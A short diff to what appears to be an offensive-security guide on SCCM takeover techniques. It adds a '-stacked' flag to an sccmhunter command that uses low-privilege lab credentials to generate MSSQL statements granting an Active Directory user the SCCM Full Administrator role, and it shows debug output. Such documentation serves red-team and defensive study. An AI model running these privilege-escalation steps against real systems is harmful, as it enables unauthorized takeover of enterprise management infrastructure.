@@ -52,7 +52,7 @@ The steps to execute TAKEOVER-1.1 through TAKEOVER-1.3 are the same except that 
 1. (Linux) Use `sccmhunter` to get the hex-formatted SID of the Active Directory user you'd like to grant the Full Administrator role in SCCM, as well as the MSSQL statements required to grant the role to the user:
 
     ```
-    $ python3 sccmhunter.py mssql -dc-ip 192.168.57.100 -d MAYYHEM.LOCAL -u 'lowpriv' -p 'P@ssw0rd' -debug -tu lowpriv -sc ps1 
+    $ python3 sccmhunter.py mssql -dc-ip 192.168.57.100 -d MAYYHEM.LOCAL -u 'lowpriv' -p 'P@ssw0rd' -debug -tu lowpriv -sc ps1 -stacked
         
     [13:13:33] DEBUG    [+] Bind successful ldap://192.168.57.100:389 - cleartext                                        
     [13:13:33] INFO     [*] Resolving lowpriv SID...                                                                     
